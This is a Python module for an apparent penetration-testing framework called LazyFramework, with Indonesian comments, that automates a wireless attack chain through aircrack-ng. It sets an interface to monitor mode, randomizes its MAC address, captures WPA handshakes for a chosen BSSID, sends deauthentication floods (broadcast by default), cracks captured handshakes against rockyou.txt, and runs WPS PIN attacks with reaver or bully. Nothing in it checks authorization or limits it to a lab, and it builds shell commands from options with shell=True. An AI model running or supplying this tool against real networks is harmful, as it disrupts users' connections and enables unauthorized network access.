# modules/recon/wireless/aircrack_suite.py
import os
import re
import subprocess
import threading
import time
from core import console

MODULE_INFO = {
    "name": "recon/wireless/aircrack_suite",
    "description": "Aircrack-ng Full Suite – Monitor, Capture, Deauth & Crack WPA/WPA2",
    "author": "LazyFramework",
    "version": "1.1",
    "rank": "Excellent"
}

OPTIONS = {
    "INTERFACE": {
        "description": "Wireless interface (contoh: wlan0, wlp2s0)",
        "required": True,
        "default": "wlan0",
        "value": ""
    },
    "MODE": {
        "description": "Pilih mode",
        "required": True,
        "default": "capture",
        "choices": ["monitor", "capture", "deauth", "handshake", "crack", "wps"],
        "value": "capture"
    },
    "BSSID": {
        "description": "Target BSSID (wajib untuk: capture, deauth, handshake, wps)", 
        "required": False,
        "default": "",
        "value": ""
    },
    "CHANNEL": {
        "description": "Channel target (1-13)",
        "required": False, 
        "default": "",
        "value": ""
    },
    "WORDLIST": {
        "description": "Path wordlist untuk crack",
        "required": False,
        "default": "/usr/share/wordlists/rockyou.txt",
        "value": ""
    },
    "CLIENT": {
        "description": "Client MAC untuk deauth (kosongkan = broadcast)",
        "required": False,
        "default": "", 
        "value": ""
    },
    "CAPFILE": {
        "description": "File .cap hasil capture",
        "required": False,
        "default": "",
        "value": ""
    },
    "TIMEOUT": {
        "description": "Timeout capture handshake (detik)",
        "required": False,
        "default": "60",
        "value": "60"
    }
}

def check_tool(tool):
    """Cek apakah tool tersedia"""
    return subprocess.run(["which", tool], capture_output=True).returncode == 0

def run_command(cmd, output_callback):
    """Jalankan command real-time dan kirim output ke GUI/console"""
    try:
        process = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        for line in process.stdout:
            if line.strip():
                output_callback(line.rstrip())
        process.wait()
        return process.returncode
    except Exception as e:
        output_callback(f"[red]Command error: {e}[/red]")
        return -1

def get_interface_mode(interface):
    """Cek current mode interface"""
    try:
        result = subprocess.run(
            f"iwconfig {interface}", shell=True, 
            capture_output=True, text=True, timeout=5
        )
        if "Mode:Monitor" in result.stdout:
            return "monitor"
        return "managed"
    except subprocess.TimeoutExpired:
        return "unknown"
    except Exception:
        return "unknown"

def set_monitor_mode(interface, enable=True):
    """Set monitor mode dengan pengecekan yang lebih baik"""
    current_mode = get_interface_mode(interface)
    
    # Jika sudah dalam mode yang diinginkan, skip
    if enable and current_mode == "monitor":
        console.print(f"[green][+] {interface} sudah dalam monitor mode[/green]")
        return True
    elif not enable and current_mode == "managed":
        console.print(f"[green][+] {interface} sudah dalam managed mode[/green]")
        return True
    
    try:
        # Matikan interface dulu
        subprocess.run(f"sudo ip link set {interface} down", shell=True, check=True)
        time.sleep(1)
        
        # Set mode
        mode = "monitor" if enable else "managed"
        result = subprocess.run(
            f"sudo iwconfig {interface} mode {mode}", 
            shell=True, capture_output=True, text=True
        )
        
        if result.returncode != 0:
            console.print(f"[yellow][!] Coba dengan iw...[/yellow]")
            result = subprocess.run(
                f"sudo iw dev {interface} set type {mode}", 
                shell=True, capture_output=True, text=True
            )
        
        # Hidupkan interface
        subprocess.run(f"sudo ip link set {interface} up", shell=True, check=True)
        time.sleep(2)
        
        # Verifikasi
        new_mode = get_interface_mode(interface)
        if enable and new_mode == "monitor":
            console.print(f"[green][+] Berhasil set {interface} ke monitor mode[/green]")
            return True
        elif not enable and new_mode == "managed":
            console.print(f"[green][+] Berhasil set {interface} ke managed mode[/green]")
            return True
        else:
            console.print(f"[red][-] Gagal set {interface} ke {mode} mode[/red]")
            return False
            
    except subprocess.CalledProcessError as e:
        console.print(f"[red][-] Error set monitor mode: {e}[/red]")
        return False
    except Exception as e:
        console.print(f"[red][-] Unexpected error: {e}[/red]")
        return False

def randomize_mac(interface):
    """Randomize MAC address"""
    try:
        # Pastikan interface down
        subprocess.run(f"sudo ip link set {interface} down", shell=True, check=True)
        time.sleep(1)
        
        # Random MAC
        result = subprocess.run(
            f"sudo macchanger -r {interface}", 
            shell=True, capture_output=True, text=True
        )
        
        # Hidupkan interface
        subprocess.run(f"sudo ip link set {interface} up", shell=True, check=True)
        time.sleep(1)
        
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if "New MAC:" in line:
                    console.print(f"[green][+] {line.strip()}[/green]")
                    return True
        return False
        
    except Exception as e:
        console.print(f"[red][-] Error randomize MAC: {e}[/red]")
        return False

def run(session, options):
    iface = options.get("INTERFACE", "wlan0")
    mode = options.get("MODE", "capture").lower()
    bssid = options.get("BSSID", "").strip()
    channel = options.get("CHANNEL", "").strip()
    wordlist = options.get("WORDLIST", "/usr/share/wordlists/rockyou.txt")
    client = options.get("CLIENT", "").strip()
    capfile = options.get("CAPFILE", "").strip()
    timeout = int(options.get("TIMEOUT", "60"))

    console.print(f"[bold blue][*] Starting Aircrack-ng Suite - Mode: {mode}[/bold blue]")

    # Validasi interface
    if not os.path.exists(f"/sys/class/net/{iface}"):
        console.print(f"[red][-] Interface {iface} tidak ditemukan![/red]")
        console.print("[yellow]   Gunakan: ip link show atau iwconfig[/yellow]")
        return

    # Validasi BSSID untuk mode yang membutuhkan
    if mode in ["capture", "handshake", "deauth", "wps"] and not bssid:
        console.print("[red][-] BSSID wajib diisi untuk mode ini![/red]")
        console.print("[yellow]   Gunakan 'show options' dan set BSSID terlebih dahulu[/yellow]")
        return

    # Validasi tools
    required_tools = ["iwconfig", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    missing_tools = [tool for tool in required_tools if not check_tool(tool)]
    if missing_tools:
        console.print(f"[red][-] Tools berikut tidak ditemukan: {', '.join(missing_tools)}[/red]")
        console.print("[yellow]   Install dengan: sudo apt install aircrack-ng[/yellow]")
        return

    # Semua mode butuh monitor mode (kecuali crack)
    if mode != "crack":
        console.print(f"[yellow][*] Setting {iface} ke monitor mode...[/yellow]")
        if not set_monitor_mode(iface, enable=True):
            console.print("[red][-] Gagal set monitor mode, coba manual:[/red]")
            console.print("[yellow]   sudo airmon-ng start wlp3s0[/yellow]")
            return

        console.print("[*] Randomize MAC address...")
        randomize_mac(iface)

    if mode == "monitor":
        console.print(f"[green][+] {iface} sekarang dalam monitor mode[/green]")
        console.print("[cyan][*] Menjalankan airodump-ng... Tekan Ctrl+C untuk berhenti[/cyan]")

        cmd = f"sudo airodump-ng {iface}"
        console.print(f"[dim]Command: {cmd}[/dim]")

        run_command(cmd, console.print)
        return

    elif mode == "capture" or mode == "handshake":
        console.print(f"[*] Target: {bssid} on channel {channel if channel else 'auto'}")
        
        if channel:
            console.print(f"[*] Lock channel {channel}...")
            subprocess.run(f"sudo iwconfig {iface} channel {channel}", shell=True)

        cap_file = f"/tmp/{bssid.replace(':', '')}_capture"
        console.print(f"[green][+] Starting handshake capture → {cap_file}.cap[/green]")
        console.print("[cyan]   Press Ctrl+C when you see 'WPA handshake'[/cyan]")
        
        cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {cap_file} {iface}"
        console.print(f"[dim]Command: {cmd}[/dim]")
        
        try:
            # Jalankan dengan timeout
            run_command(cmd, console.print)
        except KeyboardInterrupt:
            console.print("[yellow][!] Capture dihentikan oleh user[/yellow]")
        
        # Cek apakah file capture berhasil dibuat
        if os.path.exists(f"{cap_file}-01.cap"):
            console.print(f"[green][+] Capture file saved: {cap_file}-01.cap[/green]")
        else:
            console.print("[red][-] Tidak ada file capture yang dibuat[/red]")

    elif mode == "deauth":
        client_mac = client if client else "FF:FF:FF:FF:FF:FF"
        count = 10  # 10 packets default, bukan infinite
        
        console.print(f"[bold red][!] Sending {count} deauth packets to {client_mac}[/bold red]")
        console.print(f"[bold red]    from AP: {bssid}[/bold red]")
        
        cmd = f"sudo aireplay-ng --deauth {count} -a {bssid} -c {client_mac} {iface}"
        run_command(cmd, console.print)

    elif mode == "crack":
        if not capfile or not os.path.exists(capfile):
            console.print("[red][-] File .cap tidak ditemukan![/red]")
            console.print("[yellow]   Pastikan path file benar[/yellow]")
            return
            
        if not os.path.exists(wordlist):
            console.print(f"[red][-] Wordlist tidak ditemukan: {wordlist}[/red]")
            console.print("[yellow]   Download rockyou.txt atau set path yang benar[/yellow]")
            return

        console.print(f"[yellow][*] Cracking WPA handshake...[/yellow]")
        console.print(f"    File: {capfile}")
        console.print(f"    Wordlist: {wordlist}")
        
        cmd = f'sudo aircrack-ng -w "{wordlist}" -b {bssid} "{capfile}"'
        run_command(cmd, console.print)

    elif mode == "wps":
        console.print(f"[yellow][*] WPS attack terhadap {bssid}[/yellow]")
        
        # Cek apakah reaver tersedia
        if check_tool("reaver"):
            console.print("[green][+] Menggunakan reaver untuk WPS attack[/green]")
            cmd = f"sudo reaver -i {iface} -b {bssid} -vv -K 1"
            run_command(cmd, console.print)
        elif check_tool("bully"):
            console.print("[green][+] Menggunakan bully untuk WPS attack[/green]")
            cmd = f"sudo bully -b {bssid} {iface}"
            run_command(cmd, console.print)
        else:
            console.print("[red][-] Tool WPS (reaver/bully) tidak ditemukan[/red]")
            console.print("[yellow]   Install: sudo apt install reaver bully[/yellow]")

    # Kembalikan ke managed mode setelah selesai (kecuali crack)
    if mode != "crack":
        console.print("[yellow][*] Mengembalikan interface ke managed mode...[/yellow]")
        set_monitor_mode(iface, enable=False)

    console.print("[bold green][+] Aircrack-ng module selesai![/bold green]")